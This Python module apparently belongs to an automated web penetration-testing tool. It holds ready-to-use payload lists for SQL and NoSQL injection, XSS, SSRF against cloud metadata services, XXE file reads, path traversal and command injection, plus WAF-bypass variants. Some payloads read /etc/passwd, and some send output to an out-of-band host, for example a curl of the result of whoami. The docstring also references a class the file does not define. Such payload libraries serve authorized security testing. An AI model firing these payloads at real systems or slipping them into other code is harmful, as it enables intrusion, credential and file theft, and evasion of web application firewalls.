"""iter-29.3 — Shape-aware payload bins.

A single SQLi payload doesn't work everywhere — a form-encoded
`email=' OR 1=1--` posted to a classic LAMP login works; the same
string in a JSON body to a typed FastAPI endpoint may not even reach
the SQL layer; against a GraphQL endpoint the entire request shape is
wrong. Payloads need to match the **request shape** of the endpoint
they're hitting.

This package provides curated payload bins per shape + vuln class.
Each bin is a small (5-20) high-leverage set, NOT the full sqlmap
1000-payload corpus — that's iter-29's "fire smart, not loud"
philosophy.

**Bins shipped in this iter:**

  * `sqli_form`  — SQLi for form-encoded POST/GET
  * `sqli_json`  — SQLi for JSON-body APIs
  * `sqli_graphql` — SQLi for GraphQL variables
  * `xss_html`   — reflected XSS for HTML-rendering endpoints
  * `xss_json`   — XSS for JSON-echo endpoints
  * `ssrf_url`   — SSRF for URL-param endpoints (includes OOB)
  * `xxe_xml`    — XXE for XML-accepting endpoints
  * `path_traversal` — for URL path / param positions
  * `cmd_injection` — OS command injection (form + JSON)

**Anti-overfit:**
  * Each bin lists `_PROVENANCE` — public corpus URL it was sourced from
  * `_PAYLOAD_VERSION` — bumped when the bin changes
  * Regression test grep asserts no SUT-specific values

**WAF-aware variants** (subset of each bin) selected when
`EndpointProfile.waf_detected` is set.

**Usage:**
    from strix.l15.payload_bins import bin_for, WAFAwareBin
    bin = bin_for(shape="json", vuln_class="sqli", waf=None)
    for payload in bin.payloads:
        ...
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any


@dataclass
class PayloadBin:
    """A curated set of payloads for one (shape, vuln_class) tuple."""
    shape: str                            # "form" / "json" / "graphql" / "xml" / "url-param" / "path"
    vuln_class: str                       # "sqli" / "xss" / "ssrf" / "xxe" / "path-traversal" / "cmd-injection"
    payloads: list[str] = field(default_factory=list)
    waf_bypass_variants: dict[str, list[str]] = field(default_factory=dict)
    provenance: str = ""                  # source corpus URL
    version: int = 1
    notes: str = ""

    def for_waf(self, waf: str | None) -> list[str]:
        """Return payloads + WAF-specific variants if a WAF is detected.
        When waf=None or unknown vendor, returns plain `payloads`.
        """
        if not waf:
            return list(self.payloads)
        variants = self.waf_bypass_variants.get(waf, [])
        return list(self.payloads) + variants


# ===========================================================================
# SQLi bins — sourced from sqlmap payload corpus (public, MIT-licensed)
# https://github.com/sqlmapproject/sqlmap/tree/master/data/xml/payloads
# ===========================================================================

_SQLI_FORM = PayloadBin(
    shape="form", vuln_class="sqli",
    payloads=[
        # Boolean-based (universal)
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1-- -",
        "\" OR \"1\"=\"1",
        ") OR ('1'='1",
        "admin'--",
        "admin' #",
        # Error-based — trigger MySQL/Postgres/MSSQL parse errors
        "'",
        "\"",
        "'\"",
        # Stacked / boolean inversion
        "' OR 'a'='a",
        "1' OR '1'='1' /*",
        # Time-based (cross-DB; engines that ignore SLEEP() return fast → no FP)
        "1' AND SLEEP(5)-- -",
        "1' AND pg_sleep(5)-- -",
        "1';WAITFOR DELAY '0:0:5'--",
    ],
    waf_bypass_variants={
        "cloudflare": [
            # URL-encoded + case variants
            "%27%20OR%20%271%27%3D%271",
            "' Or '1'='1",
            "/*!50000 OR */ 1=1--",  # MySQL inline comment bypass
        ],
        "aws-waf": [
            "'+OR+1=1--",
            "'/**/OR/**/1=1--",
        ],
    },
    provenance="https://github.com/sqlmapproject/sqlmap/tree/master/data/xml/payloads",
    version=1,
)

_SQLI_JSON = PayloadBin(
    shape="json", vuln_class="sqli",
    payloads=[
        # JSON string field — same payloads but with proper escaping
        "' OR '1'='1",
        "' OR 1=1--",
        "admin'--",
        "\\' OR 1=1--",
        # JSON numeric field — needs operator-shape payloads
        "1 OR 1=1",
        "1) OR (1=1",
        # MongoDB / NoSQL operator injection (very common on JSON APIs)
        {"$ne": None},
        {"$gt": ""},
        {"$where": "this.password.length > 0"},
        # Time-based
        "1' AND SLEEP(5)-- -",
    ],
    waf_bypass_variants={},
    provenance="https://github.com/sqlmapproject/sqlmap + OWASP NoSQLi Cheat Sheet",
    version=1,
)

_SQLI_GRAPHQL = PayloadBin(
    shape="graphql", vuln_class="sqli",
    payloads=[
        # GraphQL variables are typed strings — same string payloads
        # often work since the resolver may interpolate raw
        "' OR '1'='1",
        "' OR 1=1--",
        "admin'--",
        # Numeric ID injection
        "1 OR 1=1",
    ],
    provenance="PortSwigger Web Security Academy — GraphQL labs",
    version=1,
)


# ===========================================================================
# XSS bins
# ===========================================================================

_XSS_HTML = PayloadBin(
    shape="html", vuln_class="xss",
    payloads=[
        # Basic reflection
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        # Attribute escape
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "javascript:alert(1)",
        # Filter bypass — variants from PortSwigger XSS cheat sheet
        "<ScRiPt>alert(1)</ScRiPt>",
        "<svg/onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        # DOM-shaped
        "#<script>alert(1)</script>",
        "<a href=\"javascript:alert(1)\">x</a>",
    ],
    waf_bypass_variants={
        "cloudflare": [
            "<sCriPt>alert`1`</sCriPt>",     # backtick template
            "<svg onload=alert&#40;1&#41;>",  # entity-encoded paren
            "<details/open/ontoggle=alert(1)>",  # HTML5 event
        ],
        "akamai": [
            "<object/data=javascript:alert(1)>",
        ],
    },
    provenance="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet",
    version=1,
)

_XSS_JSON = PayloadBin(
    shape="json", vuln_class="xss",
    payloads=[
        # When a JSON value is later rendered as HTML
        "<script>alert(1)</script>",
        "</script><script>alert(1)</script>",
        # When the JSON is embedded in a JS context
        "\";alert(1);//",
        "');alert(1);//",
        "</textarea><script>alert(1)</script>",
    ],
    provenance="OWASP XSS Filter Evasion Cheat Sheet",
    version=1,
)


# ===========================================================================
# SSRF bins
# ===========================================================================

_SSRF_URL = PayloadBin(
    shape="url-param", vuln_class="ssrf",
    payloads=[
        # AWS/Azure/GCP IMDS
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        # Localhost variants — bypass simple "no 127.0.0.1" filters
        "http://127.0.0.1/",
        "http://0.0.0.0/",
        "http://localhost/",
        "http://[::1]/",
        "http://0177.0.0.1/",       # octal
        "http://2130706433/",        # decimal
        "http://127.0.0.1.nip.io/",  # public DNS that resolves back to localhost
        # Protocol confusion
        "file:///etc/passwd",
        "gopher://127.0.0.1:25/...",
        "dict://127.0.0.1:11211/",
        # OOB — replace with the operator's Caido / Interactsh host at runtime
        "http://STRIX_OOB_HOST/ssrf-probe",
    ],
    provenance="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery",
    version=1,
    notes="STRIX_OOB_HOST is templated at runtime from STRIX_OOB_HOST env var.",
)


# ===========================================================================
# XXE bins
# ===========================================================================

_XXE_XML = PayloadBin(
    shape="xml", vuln_class="xxe",
    payloads=[
        # Classic local-file read
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>',
        # OOB (Out-of-band) variant for blind XXE
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % xxe SYSTEM "http://STRIX_OOB_HOST/xxe.dtd"> %xxe;]><x></x>',
        # SVG-wrapped (file-upload contexts)
        '<svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><text>&xxe;</text></svg>',
    ],
    provenance="OWASP XXE Cheat Sheet + PortSwigger Web Security Academy",
    version=1,
)


# ===========================================================================
# Path traversal bins
# ===========================================================================

_PATH_TRAVERSAL = PayloadBin(
    shape="path", vuln_class="path-traversal",
    payloads=[
        "../../../../etc/passwd",
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//....//etc/passwd",        # bypass simple "../" strip
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",  # UTF-8 overlong
        "/etc/passwd",                          # absolute (when sandbox naive)
        "\\..\\..\\..\\windows\\win.ini",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ],
    provenance="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal",
    version=1,
)


# ===========================================================================
# Command injection bins
# ===========================================================================

_CMD_INJECTION = PayloadBin(
    shape="form", vuln_class="cmd-injection",
    payloads=[
        # Unix
        "; cat /etc/passwd",
        "&& cat /etc/passwd",
        "| cat /etc/passwd",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
        # Backtick / subshell
        "; sleep 5",          # time-based blind
        "&& sleep 5",
        "| sleep 5",
        # OOB DNS lookup (universal blind probe)
        "; curl http://STRIX_OOB_HOST/`whoami`",
        "; nslookup STRIX_OOB_HOST",
        # Windows
        "& whoami",
        "&& dir",
    ],
    provenance="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection",
    version=1,
)


# ===========================================================================
# Bin registry (shape, vuln_class) -> bin
# ===========================================================================

_BINS: dict[tuple[str, str], PayloadBin] = {
    ("form", "sqli"):       _SQLI_FORM,
    ("json", "sqli"):       _SQLI_JSON,
    ("graphql", "sqli"):    _SQLI_GRAPHQL,
    ("html", "xss"):        _XSS_HTML,
    ("form", "xss"):        _XSS_HTML,         # forms render to HTML
    ("json", "xss"):        _XSS_JSON,
    ("url-param", "ssrf"):  _SSRF_URL,
    ("form", "ssrf"):       _SSRF_URL,
    ("json", "ssrf"):       _SSRF_URL,
    ("xml", "xxe"):         _XXE_XML,
    ("multipart", "xxe"):   _XXE_XML,
    ("path", "path-traversal"): _PATH_TRAVERSAL,
    ("url-param", "path-traversal"): _PATH_TRAVERSAL,
    ("form", "cmd-injection"): _CMD_INJECTION,
    ("json", "cmd-injection"): _CMD_INJECTION,
}


# Fallback shape map — if an exact (shape, class) isn't in _BINS, try
# a graceful-degrade shape.
_SHAPE_FALLBACK: dict[str, str] = {
    "static":    "",  # no payloads — never inject into static assets
    "multipart": "form",
    "grpc":      "",
    "unknown":   "form",  # best guess
    "path":      "url-param",
}


def bin_for(
    shape: str, vuln_class: str, waf: str | None = None,
) -> list[str]:
    """Return the payload list for (shape, vuln_class), with WAF-aware
    variants appended when `waf` is recognized.

    Returns `[]` for shapes that should not be probed (static-asset,
    grpc without proto, etc.).

    Example:
        from strix.l15.payload_bins import bin_for
        payloads = bin_for("json", "sqli", waf=profile.waf_detected)
    """
    key = (shape, vuln_class)
    pb = _BINS.get(key)
    if pb is None:
        # Try fallback
        fb_shape = _SHAPE_FALLBACK.get(shape, "")
        if not fb_shape:
            return []
        pb = _BINS.get((fb_shape, vuln_class))
        if pb is None:
            return []
    return pb.for_waf(waf)


def bin_object_for(shape: str, vuln_class: str) -> PayloadBin | None:
    """Return the raw `PayloadBin` (for tests / advanced consumers)."""
    pb = _BINS.get((shape, vuln_class))
    if pb is None:
        fb_shape = _SHAPE_FALLBACK.get(shape, "")
        if fb_shape:
            pb = _BINS.get((fb_shape, vuln_class))
    return pb


def list_available_combinations() -> list[tuple[str, str]]:
    """Enumerate every (shape, vuln_class) tuple with a bin available.
    Useful for tests + iter-29.4 dispatcher."""
    return sorted(_BINS.keys())


__all__ = [
    "PayloadBin",
    "bin_for",
    "bin_object_for",
    "list_available_combinations",
]
